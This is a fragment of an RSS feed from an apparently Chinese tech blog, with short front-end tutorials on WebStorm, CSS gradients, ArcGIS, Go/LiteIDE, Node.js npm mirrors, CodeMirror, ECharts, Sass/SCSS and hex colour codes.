      <description>一、下载安装包 Webstorm 2017.1.4 【非汉化版】百度云盘下载地址&#xA;Webstorm 2017.2 【汉化版】百度云盘下载地址，密码：8oya&#xA;二、安装过程（包含输入注册码永久使用） 双击下一步下一步即可，过程中有几个步骤说明一下：&#xA;1. 配置 Webstorm 安装项 选择 64 位，防止桌面 Webstorm 快捷方式打不开。&#xA;配置 Webstorm 安装项 2. 是否导入 Webstorm 配置信息 这里的意思是之前使用过 Webstorm ，并且配置过，Webstorm 配置信息可以起到优化性能的作用，因为它本身是个比较吃内存的东西，文件多了容易卡顿，可以通过在配置文件中得到优化，后面单独介绍优化。&#xA;剧透：Webstorm 安装完成后配置信息位置：C:\Users\Administrator\.WebStorm2017.1。&#xA;web Post navigation Previous Post:WebStorm：令人眼前一亮的一款前端开发IDENext Post:虚拟机快照和重置 Recent Posts 暗网网址导航大全（2021年12月更新） 暗网网址合集 暗网链接 Deep Web Link Director 全球十大暗网搜索引擎 最详细的暗网教程——tor洋葱浏览器的安装和使用方法 最新darkweb暗网搜索引擎——Tordex | The Uncensored Tor Search Engine 顶级保密暗网网址分享 如何进入暗网？教程+工具 Tor 洋葱浏览器 如何进入暗网详细步骤（暗网网桥获取方法） 什么是“暗网”？我们该如何访问? Deep Web / Dark Web 大全 Tagsandroid (10) application (5) google (7) hacker (5) internet (5) java (7) Linux (16) network (6) qq (4) Source Code Analysis (15) tor (44) ubuntu (14) web (21) windows (9) 互联网 (7) 产品 (6) 代理服务器 (5) 信息安全 (4) 其他 (7) 区块链 (4) 存储 (4) 安全 (11) 工作 (20) 工具 (10) 手机 (9) 搜索引擎 (5) 暗网 (16) 服务器 (10) 杂项 (17) 活动 (12) 测试 (5) 浏览器 (19) 深度学习 (5) 照片 (6) 爬虫 (7) 物理学猜想 (10) 环境搭建 (3) 生活 (23) 电信 (4) 电话 (5) 百度 (4) 算法 (5) 网络 (52) 网络安全 (18) 网络安全知识 (6) Categories AI (5) AltiumDesigner (7) BTC (6) darknet (25) Database (3) DeepLearning (78) Docker (1) GIS (9) Google (2) iOS (7) IT (7) java (37) Life (93) linux (86) LPC (11) macOS (6) mysql (5) Python (52) qt (5) SEO (2) threejs (5) Unity (19) 产品设计 (15) 人工智能 (12) 信息安全 (36) 前端 (128) 区块链 (14) 图像处理 (59) 图形视频 (36) 大数据 (15) 嵌入式 (7) 工具 (45) 开发 (57) 性能优化 (2) 技术 (18) 搜索 (10) 操作系统 (35) 教程知识 (1) 教育 (2) 数字图像处理 (3) 数据分析 (2) 数据库 (4) 数据结构 (3) 数论 (1) 显卡驱动 (1) 智能搜索技术 (3) 未分类 (496) 机器学习 (23) 模型压缩 (2) 模拟电路 (1) 模拟题 (1) 比特币 (3) 水下图像增强 (1) 测试 (4) 浏览器 (1) 深网 (2) 渗透测试 (4) 游戏 (2) 游戏开发 (16) 爬虫 (6) 环境搭建 (2) 生活 (5) 电子商务 (1) 硬件设计 (1) 社工库 (1) 神经机制 (1) 移动web (1) 移动开发 (76) 程序员 (6) 站长 (1) 算法 (9) 统计搜索 (9) 网络优化 (7) 网络安全 (80) 视觉 (4) 计算机 (31) 论文 (8) 设计 (6) 资源搜集 (1) 资讯 (34) 软件工具 (15) 软件开发 (26) 运维 (21) 逆向 (2) 项目管理 (4) Archives December 2021 (1) August 2021 (8) April 2020 (4) March 2020 (63) February 2020 (154) January 2020 (134) December 2019 (14) November 2019 (25) October 2019 (27) September 2019 (43) August 2019 (32) July 2019 (51) June 2019 (49) May 2019 (65) April 2019 (64) March 2019 (97) February 2019 (49) January 2019 (78) December 2018 (70) November 2018 (69) October 2018 (31) September 2018 (73) August 2018 (109) July 2018 (70) June 2018 (58) May 2018 (51) April 2018 (52) March 2018 (52) February 2018 (19) January 2018 (25) December 2017 (39) November 2017 (31) October 2017 (26) September 2017 (42) August 2017 (46) July 2017 (50) June 2017 (71) May 2017 (32) April 2017 (29) March 2017 (36) February 2017 (18) January 2017 (25) December 2016 (20) November 2016 (17) October 2016 (19) September 2016 (14) August 2016 (23) July 2016 (26) June 2016 (15) May 2016 (11) April 2016 (21) March 2016 (18) February 2016 (21) January 2016 (14) December 2015 (13) November 2015 (13) October 2015 (6) September 2015 (7) August 2015 (12) July 2015 (11) June 2015 (3) May 2015 (9) April 2015 (12) March 2015 (7) February 2015 (10) January 2015 (10) December 2014 (14) November 2014 (6) October 2014 (10) September 2014 (6) August 2014 (10) July 2014 (11) June 2014 (6) May 2014 (9) April 2014 (6) March 2014 (5) February 2014 (3) January 2014 (3) December 2013 (12) November 2013 (7) October 2013 (6) September 2013 (7) August 2013 (4) July 2013 (5) June 2013 (6) May 2013 (28) April 2013 (17) March 2013 (4) February 2013 (2) January 2013 (6) December 2012 (6) November 2012 (4) October 2012 (6) September 2012 (6) August 2012 (4) July 2012 (8) June 2012 (5) May 2012 (8) April 2012 (15) March 2012 (5) February 2012 (2) January 2012 (3) December 2011 (9) November 2011 (4) October 2011 (1) September 2011 (4) August 2011 (4) July 2011 (4) June 2011 (4) May 2011 (6) April 2011 (2) March 2011 (4) February 2011 (2) January 2011 (3) December 2010 (6) November 2010 (6) October 2010 (5) September 2010 (8) August 2010 (8) July 2010 (7) June 2010 (3) May 2010 (14) April 2010 (7) February 2010 (4) January 2010 (11) December 2009 (8) November 2009 (3) October 2009 (5) September 2009 (4) July 2009 (7) April 2009 (5) March 2009 (5) February 2009 (3) January 2009 (3) December 2008 (5) November 2008 (5) October 2008 (3) September 2008 (3) August 2008 (2) July 2008 (5) June 2008 (6) May 2008 (9) April 2008 (4) March 2008 (5) February 2008 (4) January 2008 (3) December 2007 (6) November 2007 (3) October 2007 (1) September 2007 (5) August 2007 (2) July 2007 (3) June 2007 (3) May 2007 (1) April 2007 (1) March 2007 (2) February 2007 (2) January 2007 (3) December 2006 (1) November 2006 (3) September 2006 (3) July 2006 (1) June 2006 (3) May 2006 (3) April 2006 (1) March 2006 (2) February 2006 (3) January 2006 (1) December 2005 (2) November 2005 (1) September 2005 (1) August 2005 (1) July 2005 (2) April 2005 (2) March 2005 (3) February 2005 (2) January 2005 (2) December 2004 (2) November 2004 (4) September 2004 (2) August 2004 (2) July 2004 (2) September 2003 (1) May 2002 (1) March 2002 (1) Copyright ©️uzzz.</description>
    </item>
    <item>
      <title>WebStorm：令人眼前一亮的一款前端开发IDE</title>
      <link>https://anwangtanmi.github.io/posts/238ce6865b8e7fa9f349bd0e8ffed871/</link>
      <pubDate>Sat, 20 Jan 2018 18:39:45 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/238ce6865b8e7fa9f349bd0e8ffed871/</guid>
      <description>WebStorm：令人眼前一亮的一款前端开发IDE 从最初的dreamweaver,到Notpad++,再到aptana，每一款IDE总让我我感觉少了点什么东西。WebStorm却让我眼前一亮，虽然公司项目所用的开发环境是eclipse+aptana（主要是方便团队协作和工程调试），但是其他时间我都会学习使用WebStorm，现在4.0版本已经出来了，让我们来看看它都有哪些强大之处吧：&#xA;浏览器支持细节提示 关键字，标签，变量，参数和功能的javascript代码完成是基于支持DOM的流行的浏览器（IE，火狐等）标准，可以显示在不同浏览器之下的支持细节。&#xA;智能的代码导航和搜索提示 ECMAScript的Harmony支持 WebStorm支持最新的ECMAScript版本，你可以尝试新的功能，每个javascript引擎的实现增加了别人所不具备的一些不错的功能，当您使用的目前选定的javascript版本不支持，WebStorm将通知您，并建议速战速决：&#xA;支持CoffeeScript CoffeeScript是一种编程语言，编译javascript和增强其简洁性和可读性，同时还增加了一些复杂的功能，像阵列的理解和模式匹配。WebStorm提供您：&#xA;代码导航和完成 重命名重构 语法高亮 错误检查 查找使用实例 支持Node.js WebStorm允许你调试和验证您的服务器端javascript – Node.js的应用。&#xA;编辑CommonJS的模块结构，并提出适当的自动完成选项：&#xA;javascript的重构 为javascript提供的重构功能，让您可以轻松地修改代码结构，以及撤消修改。&#xA;移动/复制 安全删除 提取到嵌入的脚本文件 重命名 提取变量/函数 内联变量/函数 javascript单元测试 如果你是一个javascript开发人员，你可能知道，您的应用程序的质量和正确性是至关重要的。那么，一致性测试和回归测试正好是你的痛苦少一点。支持JsTestDriver插件。&#xA;WebStorm为单元测试提供了一个清晰的画面。从现在开始，JsTestDriver用户可以测量代码覆盖率。&#xA;在IDE线行使你的单元测试：&#xA;你还可以看到文件和目录在项目视图的测试覆盖率统计：&#xA;代码检查和快速修复 为了确保更好的代码质量，WebStorm可以捕捉动态的javascript代码中的常见错误…&#xA;…，并为他们提供了快速修复。&#xA;支持JSLint / JSHint javascript代码质量工具集成在IDE中。&#xA;基于Mozilla Firefox的javascript调试器 HTML和javascript断点 定制断点属性：暂停模式，条件，通过计数 帧，变量和javascript调试器 javascript表达式的运行评价 批量代码分析 无需通过点击所有文件或部署到服务器。整个源代码树的启动代码分析，可以在一个单一的视图中看到所有的结果。&#xA;语言混合编辑 支持任何代码中的“外部”和“内部”的语言 – 享受以外的javascript代码块，或在javascript字符串文字编码的CSS，HTML，SQL等。&#xA;拼写检查 集成拼写检查验证在标签的文本，代码串，评论，以避免您的网页上的拼写错误和错别字。以确保代码的可读性更好，甚至变量名，CSS类和ID拼写检查。&#xA;智能重复代码检测 支持HTML5 WebStorm也明白你的代码和每个元素的类型，并显示新的HTML5元素支持的方法：&#xA;只需按Ctrl +空格，WebStorm会显示所有可能的自动完成选项。&#xA;验证和快速修复 WebStorm可以修复检测下列问题，并给你更合理的建议建议：&#xA;无效的CSS选择器的格式 无效的CSS属性 未使用的CSS类定义 无效的本地锚和更多… 缺少必需的属性 无效的属性或非法值 错误的引用文件中的链接 重复的属性 每当你看到一个灯泡，打ALT +回车，看看WebStorm有什么建议：</description>
    </item>
    <item>
      <title>CSS之linear-gradiend ——实现网格背景效果</title>
      <link>https://anwangtanmi.github.io/posts/3b41abfe004c19f5c21f9b8ad384ecad/</link>
      <pubDate>Mon, 15 Jan 2018 12:03:38 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/3b41abfe004c19f5c21f9b8ad384ecad/</guid>
      <description>要实现效果图：&#xA;第一步：从上到下画直线。&#xA;第二步：从左到右画直线。&#xA;其中body代码：&#xA;css代码：&#xA;即设置div.box的背景颜色为orange，再设置其内部div的linear-gradient的css属性值。实现网格效果。&#xA;下面更改 .one 的 linear-gradient 属性值一步步分析（.one 的height属性值不变）：&#xA;方法一： 第一步：从上到下画直线。 当 .one 的 linear-gradientcss样式为&#xA;background: -webkit-linear-gradient(top, transparent 40px, yellow 41px);&#xA;的时候。 效果图： 该css属性值的意思可以解释为：top：从上到下开始，0~40px处为transparent透明，从41px开始背景颜色为yellow，因为 .box 的背景颜色是orange，故透明的时候即仍然是orange色。就形成了上边的效果图。&#xA;若想实现一条直线效果。那么我们可以让前边40px透明后，再让41px之后的42px开始也变成透明。即只设置41px的时候背景颜色yellow。在41px处形成一条1px的黄色直线。&#xA;此时可以使用background-size属性。background-size 属性规定背景图片的大小。&#xA;当 .one 的 linear-gradientcss样式为&#xA;background: -webkit-linear-gradient(top, transparent 40px, yellow 41px);&#xA;background-size: 41px 41px;&#xA;background-repeat: no-repeat;&#xA;的时候。 效果图： 即规定背景图像的宽高为41px的尺寸。即规定背景图片的大小在宽度和高度为41px为止的时候借宿。那么yellow背景色将只留在41px处，之后的yellow背景色都不再存在。&#xA;为了便于观察我们刚刚将背景设为不平铺，而linear-gradient默认平铺，此时再将background-repeat属性去掉，效果图将变为：&#xA;可以发现刚刚不平铺的时候只有下边有1px的黄线，右边没有。那是因为设置的linear-gradient属性值是从上到下的。现在开始画从左到右的竖线。即加一个从左到右的linear-gradient属性值。&#xA;第二步：从左到右画直线。 当 .one 的 linear-gradientcss样式为&#xA;background: -webkit-linear-gradient(top, transparent 40px, yellow 41px),-webkit-linear-gradient(left, transparent 40px, yellow 41px);&#xA;background-size: 41px 41px;</description>
    </item>
    <item>
      <title>arcgis-api-for-js-之创建一个3D地图</title>
      <link>https://anwangtanmi.github.io/posts/24b3fa5ea5bee8fe187eeeb7debe4245/</link>
      <pubDate>Tue, 02 Jan 2018 15:26:57 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/24b3fa5ea5bee8fe187eeeb7debe4245/</guid>
      <description>1.引用资源 首先跟创建2D地图一样，在head标签内部，使用script和link标签引用ArcGIS API for JavaScript，代码如下： &#34;stylesheet&#34; href=&#34;https://js.arcgis.com/4.6/esri/css/main.css&#34;&amp;gt; 同样该script标记从CDN加载ArcGIS API for JavaScript。当新版本的API发布时，更新版本号以对应新发布的版本。&#xA;该link标签引用main.css样式表，其中包含特定于Esri窗口小部件和组件的样式。&#xA;2.加载模块 其中加载模块中的内容，跟创建2D地图一样，这里就不在累赘，可以参考前期的创建一个2D地图的文章，代码如下：&#xA;esri/views/SceneView – 加载允许在3D中查看地图的代码&#xA;3.创建地图 创建一个Map对象，它是从esri/Map模块加载的Map类的引用。我们可以通过Map对象传递给构造函数来指定地图属性，例如和“ground”。这里是设置地图的属性，比如说我们需要加载的底图啊，地图的地面属性啊等等，而后面我们创建的3D视图，是设置我们所看到地图的样子，可以设置显示的中心位置，以及放大的级数等等。代码如下：&#xA;require([ &#34;esri/Map&#34;, &#34;esri/views/SceneView&#34;, &#34;dojo/domReady!&#34; ], function(Map, SceneView) { var map = new Map({ basemap: &#34;streets&#34;, ground: &#34;world-elevation&#34; }); }); 其中basemap为加载的底图，其他底图的选项有：satellite，hybrid，topo，gray，dark-gray，oceans，osm，national-geographic。 ground指定地图的表面属性，字符串“world-elevation”使用世界高程服务指定地面的一个实例。&#xA;4.创建一个3D视图 创建一个新的SceneView并通过传递一个对象给它的构造函数来设置它的属性： 代码如下：&#xA;require([ &#34;esri/Map&#34;, &#34;esri/views/SceneView&#34;, &#34;dojo/domReady!&#34; ], function(Map, SceneView) { var map = new Map({ basemap: &#34;streets&#34;, ground: &#34;world-elevation&#34; }); var view = new SceneView({ container: &#34;viewDiv&#34;, // container为容器的意思，这里对将包含视图的DOM节点的引用，就是承载地图的div容器的id。 map: map // 引用我们在上一步中创建的地图对象 scale: 500000, // 设置显示的比例尺的大小 center: [103.</description>
    </item>
    <item>
      <title>Golang LiteIDE的安装</title>
      <link>https://anwangtanmi.github.io/posts/b848f387d8f96b3c89e5343b65e147e5/</link>
      <pubDate>Mon, 01 Jan 2018 14:47:50 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/b848f387d8f96b3c89e5343b65e147e5/</guid>
      <description>版本：LiteIDE 33.1 语言：Go&#xA;总起：&#xA;这两天开始学了Photon服务器，然后想到其在免费版的限制，而且部署到Linux貌似不很很好，所以在网上寻找可以快速上手的服务器。&#xA;主要还是做客户端，但如果是小项目练习的话，总归还是避不开服务端的开发吧。在网上看了很久，最后在Erlang和Go上犹豫了一下，最终还是选择了Go，不过还是有点顾虑，毕竟Go只是一种语言，没有说是大家都在使用游戏服务端框架。&#xA;不过看大家说几个星期就很轻松的入门，想着开发起来也不难吧，最后就敲定使用Go了（我主攻也不是服务端，越轻松越好）。&#xA;这边参考了一下Defonds大神的文章，记录了一下LiteIDE的安装。&#xA;安装：&#xA;♦ Go语言&#xA;下载地址：https://golang.org/dl/&#xA;下完之后按照安装程序一步步安装就好，路径随意，环境变量安装程序会自动添加，所以没有太大的关系。&#xA;最后在CMD上看到以下结果就表示安装完成：&#xA;♦ MinGW&#xA;下载地址：https://sourceforge.net/projects/mingw/&#xA;当年练习C++的时候就用的这个工具，好怀念。&#xA;安装完之后正式安装包：mingw-developer-toolkit和mingw32-base。在Basic Setup中，然后在菜单栏Installation -&amp;gt; Apply Changes。等待安装完成：&#xA;MinGW的bin目录需要添加到环境变量的PATH下，添加完成后CMD中有以下结果就算是成功了：&#xA;♦ LiteIDE&#xA;下载地址：https://sourceforge.net/projects/liteide/&#xA;安装完成后打开IDE，主要要配置Go语言和MinGW的环境变量。&#xA;菜单栏找到查看 -&amp;gt; 选项 -&amp;gt; LiteEnv，双击system.env进行配置，比如我本机的配置如下：&#xA;# native compiler windows 386&#xA;GOROOT=D:\tools\Go&#xA;#GOBIN=&#xA;GOARCH=amd64&#xA;GOOS=windows&#xA;CGO_ENABLED=1&#xA;PATH=D:\tools\MinGW\bin;%GOROOT%\bin;%PATH%&#xA;LITEIDE_GDB=gdb64&#xA;LITEIDE_MAKE=mingw32-make&#xA;LITEIDE_TERM=%COMSPEC%&#xA;LITEIDE_TERMARGS=&#xA;LITEIDE_EXEC=%COMSPEC%&#xA;LITEIDE_EXECOPT=/C&#xA;大家可以参考一下。&#xA;完成之后，菜单栏 文件 -&amp;gt; 新建 选择Command Project就可以开始一个命令行的工程了。</description>
    </item>
    <item>
      <title>JS-设置弹窗时候禁用滚动条</title>
      <link>https://anwangtanmi.github.io/posts/16a434ba3fa6a084ef425d4af49b8891/</link>
      <pubDate>Mon, 25 Dec 2017 15:27:47 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/16a434ba3fa6a084ef425d4af49b8891/</guid>
      <description>方法一&#xA;启用禁用时，设置js&#xA;document.documentElement.style.overflowY = &#39;hidden&#39;; 当还原时候，只需要把属性重置scroll就可以了&#xA;document.documentElement.style.overflowY = &#39;scroll&#39;; 方法二&#xA;方法一仅仅是滚动条的隐藏和显示。如果想要在显示滚动条条件下，实现这一功能，需要绑定scroll的事件&#xA;启用禁用时&#xA;var tops = $(document).scrollTop();//当页面滚动时，把当前距离赋值给页面，这样保持页面滚动条不动 $(document).bind(&#34;scroll&#34;,function (){$(document).scrollTop(tops); }); 当重置时，只需要解绑此事件&#xA;$(document).unbind(&#34;scroll&#34;); 两种方法可以应对不同的使用情景，隐藏滚动条的方法（方法一）在实际操作时，因为滚动条会占位，所以视觉上会出现屏幕变大缩小的效果，所以还需要对滚动条的占位进行一个设置&#xA;隐藏滚动条时：&#xA;window.innerWidth //浏览器可用宽度 document.body.clientWidth// body的宽度 var m=window.innerWidth-document.body.clientWidth;//滚动条的宽度 document.documentElement.style.marginRight=m+&#34;px&#34;; //或者 document.documentElement.style.paddingRight=m+&#34;px&#34;; //这样就会把滚动条的占位处理好&#xA;//显示滚动条：&#xA;document.documentElement.style.marginRight=&#34;0px&#34;; //或者 document.documentElement.style.paddingRight=&#34;0px&#34;; //此时还可能存在一个问题，自己的弹出框在打开关闭的时候会有轻微的位移，也是因为滚动条的缘故，所以根据自己的需要，来进行设置修改&#xA;//隐藏滚动条打开弹窗时：&#xA;$(&#39;弹窗&#39;).css(&#34;right&#34;,m+&#34;px&#34;);//根据自己需要调整属性 //显示滚动条关闭弹窗时：&#xA;$(&#39;弹窗&#39;).css(&#34;right&#34;,&#34;0px&#34;);//根据自己需要调整属性 //方法二在滚动时，大多数的浏览器都可以适应，但是IE浏览器会出现比较明显的滚动强制重置 效果。&#xA;//bootstrup的模态框是一种不错的弹出框，完美解决了滚动条的问题，如果没有特殊要求，可以考虑bootstrup。</description>
    </item>
    <item>
      <title>Nodejs-8.9.3 安装与使用</title>
      <link>https://anwangtanmi.github.io/posts/eae7f96e1f4b4c08f5ea4eb94c0cbf6b/</link>
      <pubDate>Fri, 22 Dec 2017 23:30:20 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/eae7f96e1f4b4c08f5ea4eb94c0cbf6b/</guid>
      <description>nodejs Node 就是 JavaScript 语言在服务器端的运行环境. Node是一个JavaScript的运行环境（平台），不是一门语言，也不是JavaScript的框架&#xA;Nodejs安装 安装很简单，在官网下载直接安装即可 官网地址： https://nodejs.org/en/download/&#xA;Nodejs解决卡死下载慢的问题 在使用npm install 有使用安装会卡住不动、或者下载慢的问题 解决办法就是使用国内的镜像来访问。 淘宝提供的镜像不错，使用如下方式来下载就会很快&#xA;npm install -gd express -registry=http://registry.npm.taobao.org 为了避免每次使用-registry=http://registry.npm.taobao.org 我们可以：&#xA;npm config set registry http://registry.npm.taobao.org 这样我们在使用命令就可以不用加-registry参数，比如：&#xA;npm install webpack -g 验证是否设置上镜像：&#xA;C:\WINDOWS\system32&amp;gt;npm config get registry https://registry.npm.taobao.org/ 配置文件 在用户根目录有一个.npmrc文件，这个文件是配置npm一些参数：&#xA;prefix=E:\nodejs\node_global //npm install 安装路径 cache=E:\nodejs\node_cache //npm 缓存路径 registry=https://registry.npm.taobao.org //npm 镜像 关于环境变量 如果使用msi安装包进行安装nodejs在安装过程中会配置环境变量 如果我们认为改变了npm install安装路径那么需要在用户环境变量中配置环境变量，才能直接使用我们install 模块的命令&#xA;CNPM npm（node package manager）是nodejs的包管理器,用于node插件管理,比如插件的安装、更新、卸载 因为npm安装插件是从国外服务器进行下载，受网络影响很大，可能出现异常，CNPM命令就是为了解决这个问题。这个命令和npm命令用户用法一致。 安装：&#xA;npm install cnpm -g --registry=https://registry.npm.taobao.org REPL环境 其实就是nodejs提供测试调试环境，类似谷歌浏览器的debug调试工具，我们可以在这个环境中测试我们的代码。</description>
    </item>
    <item>
      <title>codemirro 设置提示信息</title>
      <link>https://anwangtanmi.github.io/posts/9cd798bfc0c7ef62f9f2cb32c0a4cfaa/</link>
      <pubDate>Fri, 08 Dec 2017 18:28:37 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/9cd798bfc0c7ef62f9f2cb32c0a4cfaa/</guid>
      <description>我们公司用的是自己的开发的sql视图工具,实现sql自动提示功能的时候用到了codemirror编辑器,看了一些资料就着手开发,但遇到提示信息设置的时候,遇到难题了,查了度娘,没有找到codemirror相关的设置提示信息的属性,而官网提供的api我只想说太rubbish&#xA;codemirror官网:http://codemirror.net/&#xA;javascritpt爱好者:http://www.hyjiacan.com/codemirror-basic-usage/ 有中文的文档&#xA;皇天不负苦心人吧最好还是找到了解决办法&#xA;hintOptions: {&#xA;tables: source&#xA;}&#xA;这个属性是设置提示的信息&#xA;var source={app: [“name”, “score”, “birthDate”],version: [“name”, “score”, “birthDate”],dbos: [“name”, “population”, “size”]};&#xA;这样就能提示source中的信息&#xA;我用的mode是sql&#xA;这里有我自己弄的demo,大家可以看着学习:http://download.csdn.net/download/j_cxn/10151541</description>
    </item>
    <item>
      <title>前端Echart图表展示</title>
      <link>https://anwangtanmi.github.io/posts/73054f68fead9b4f4edf2a2151cd17b9/</link>
      <pubDate>Fri, 24 Nov 2017 18:55:05 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/73054f68fead9b4f4edf2a2151cd17b9/</guid>
      <description>Echart是一款非常强大和简单的展示报表的插件，最近业务需求，需要用到报表方面的功能，这里推荐使用Echart插件，非常轻便和简介，操作简单易于上手，下面就列举一个柱状图和饼状图的代码：&#xA;主要是使用一个div标签，然后使用js进行渲染完成的，下面分别是饼状图和柱状图的js结构代码：&#xA;柱状图:&#xA;option = {&#xA;color: [‘#3398DB’],&#xA;tooltip : {&#xA;trigger: ‘axis’,&#xA;axisPointer : { // 坐标轴指示器，坐标轴触发有效&#xA;type : ‘shadow’ // 默认为直线，可选为：’line’ | ‘shadow’&#xA;}&#xA;},&#xA;grid: {&#xA;left: ‘3%’,&#xA;right: ‘4%’,&#xA;bottom: ‘3%’,&#xA;containLabel: true&#xA;},&#xA;xAxis : [&#xA;{&#xA;type : ‘category’,&#xA;data : //json1,&#xA;axisTick: {&#xA;alignWithLabel: true&#xA;}&#xA;}&#xA;],&#xA;yAxis : [&#xA;{&#xA;type : ‘value’&#xA;}&#xA;],&#xA;series : [&#xA;{&#xA;name:’直接访问’,</description>
    </item>
    <item>
      <title>Sass/SCSS（关系，安装，webstorm配置编译，使用，语法）</title>
      <link>https://anwangtanmi.github.io/posts/e21a48819e4a094dfd80e61072fddc3a/</link>
      <pubDate>Thu, 02 Nov 2017 17:17:11 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/e21a48819e4a094dfd80e61072fddc3a/</guid>
      <description>Sass/SCSS的关系，SCSS的安装，webstorm编译配置SCSS，SCSS使用（语法） 一 、 Sass、SCSS Sass：一种css预处理器和一种语言。Sass（预处理器）有两种不同的语法：&#xA;Sass : 一种缩进语法 SCSS : 一种 CSS-like 语法 Sass&#xA;Sass使用类似Ruby的语法，没有花括号，没有分号，具有严格的缩进，就像这样：&#xA;// 变量 !primary-color= hotpink // 混入 =border-radius(!radius) -webkit-border-radius= !radius -moz-border-radius= !radius border-radius= !radius .my-element color= !primary-color width= 100% overflow= hidden .my-other-element +border-radius(5px) //@import @import themes/dark @import font.sass * 注：变量的标志用 !，而不是 $；分配符是 = 而不是 : 。&#xA;SCSS&#xA;SCSS和Sass相比更加贴近CSS语法。Sass语法中的!和=换成了SCSS中的$和:。就像这样：&#xA;// 变量 $primary-color: hotpink; // 混入 @mixin border-radius($radius) { -webkit-border-radius: $radius; -moz-border-radius: $radius; border-radius: $radius; } .my-element { color: $primary-color; width: 100%; overflow: hidden; } .</description>
    </item>
    <item>
      <title>前端所有表示颜色的代码</title>
      <link>https://anwangtanmi.github.io/posts/2279b50dbcc239803c7560f46e5f8825/</link>
      <pubDate>Wed, 01 Nov 2017 16:13:37 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/2279b50dbcc239803c7560f46e5f8825/</guid>
      <description> 000000 000033 000066 000099 0000CC 0000FF 003300 003333 003366 003399 0033CC 0033FF 006600 006633 006666 006699 0066CC 0066FF 009900 009933 009966 009999 0099CC 0099FF 00CC00 00CC33 00CC66 00CC99 00CCCC 00CCFF 00FF00 00FF33 00FF66 00FF99 00FFCC 00FFFF 330000 330033 330066 330099 3300CC 3300FF 333300 333333 333366 333399 3333CC 3333FF 336600 336633 336666 336699 3366CC 3366FF 339900 339933 339966 339999 3399CC 3399FF 33CC00 33CC33 33CC66 33CC99 33CCCC 33CCFF 33FF00 33FF33 33FF66 33FF99 33FFCC 33FFFF 660000 660033 660066 660099 6600CC 6600FF 663300 663333 663366 663399 6633CC 6633FF 666600 666633 666666 666699 6666CC 6666FF 669900 669933 669966 669999 6699CC 6699FF 66CC00 66CC33 66CC66 66CC99 66CCCC 66CCFF 66FF00 66FF33 66FF66 66FF99 66FFCC 66FFFF 990000 990033 990066 990099 9900CC 9900FF 993300 993333 993366 993399 9933CC 9933FF 996600 996633 996666 996699 9966CC 9966FF 999900 999933 999966 999999 9999CC 9999FF 99CC00 99CC33 99CC66 99CC99 99CCCC 99CCFF 99FF00 99FF33 99FF66 99FF99 99FFCC 99FFFF CC0000 CC0033 CC0066 CC0099 CC00CC CC00FF CC3300 CC3333 CC3366 CC3399 CC33CC CC33FF CC6600 CC6633 CC6666 CC6699 CC66CC CC66FF CC9900 CC9933 CC9966 CC9999 CC99CC CC99FF CCCC00 CCCC33 CCCC66 CCCC99 CCCCCC CCCCFF CCFF00 CCFF33 CCFF66 CCFF99 CCFFCC CCFFFF FF0000 FF0033 FF0066 FF0099 FF00CC FF00FF FF3300 FF3333 FF3366 FF3399 FF33CC FF33FF FF6600 FF6633 FF6666 FF6699 FF66CC FF66FF FF9900 FF9933 FF9966 FF9999 FF99CC FF99FF FFCC00 FFCC33 FFCC66 FFCC99 FFCCCC FFCCFF FFFF00 FFFF33 FFFF66 FFFF99 FFFFCC FFFFFF #FFFCFB #FEFCFB #FEFCFC #FDFCFC #FFF8F6 #FDF9F7 #FCF9F8 #FBF9F9 #FFEDE9 #FCEFEC #F9F0EE #F6F2F1 #FFDCD4 #F8DED9 #F4E3DF #EFE6E4 #FFC4B7 #F5C9C0 #EDCFC9 #E4D5D2 #FFAB98 #F0B3A5 #E5BBB2 #D8C3BE #FF967E #EDA08F #DEAA9E #CEB4AE #FF6947 #E5785F #D18675 #BA948C #FF4419 #DF5738 #C56852 #A87A6F #FF3000 #DC4522 #BF5840 9F6B5F #E62B00 #C63E1F #AC4F39 #8F6156 #B82200 #9E3118 #8A3F2E #734D45 #931B00 #7E2713 #6E3225 #5C3E37 #671300 #581B0D #4D231A #402B26 #581000 #4C180C #421E16 #372521 #3E0B00 #361008 #2E140F #261A17 #FFFDFA #FEFCFA #FDFCFB #FDFDFC #FFF7EF #FDF7F1 #FBF7F3 #F9F7F5 #FFEBD8 #FAEBDD #F5EBE2 #F0EBE6 #FFD7B2 #F5D7BB #EBD7C5 #E2D8CF #FFCE9F #F3CEAB #E7CEB7 #DBCFC3 #FFBD7E #EFBD8E #DEBD9E #CEBEAE #FFA147 #E8A15E #D1A275 #BAA28C #FF8A19 #E28A36 #C58A52 #A88B6F #FF7E00 #DF7E20 #BF7F40 #9F7E5F #E87100 #CA711D #AD733A #917357 #CC6400 #B2641A #986433 #7F654C #AB5300 #955315 #80542B #6B5540 #813E00 #713F10 #603F20 #503F30 #5B2C00 #4F2C0B #442D17 #392D22 #3B1D00 #331C07 #2C1D0F #251D16 #231100 #1E1104 #1A1109 #16110D #FFFCF2 #FBFAF5 #FBFAF5 #FAF9F7 #FFF9E7 #F9F6ED #F9F6ED #F6F4F0 #FFF5D9 #FAF3DE #F5F0E2 #F0EEE7 #FFEFBF #F7EBC7 #EFE7CF #E7E3D7 #FFE69D #F2DFA9 #E6D9B5 #DAD4C2 #FFDC74 #EDD385 #DCCA97 #CBC2A8 #FFD047 #E8C45E #D1B975 #BAAE8C #FFC519 #E2B636 #C5A852 #A89A6F #FFC000 #DFAF20 #BF9F40 #9F8F5F #F3B600 #D4A61E #B6973D #98895B #DBA300 #BF951B #A48837 #897B52 #BA8B00 #A27F17 #8B732E #746846 #956F00 #826512 #6F5C25 #5D5338 #705400 #624D0E #54461C #463F2A #4F3B00 #45360A #3B3114 #312C1D #332600 #2C2206 #26200D #201D13 #FFFEF8 #FEFDF9 #FDFDFA #FCFCFA #FFFDEF #FDFBF1 #FBFAF3 #F9F8F5 #FFFCE0 #FBF9E4 #F7F5E8 #F3F2EB #FFFAC7 #F8F4CE #F1EED5 #EAE9DC #FFF7A2 #F3EFAD #E7E3B9 #DCDAC5 #FFF270 #EDE382 #DBD494 #C9C6A5 #FFED33 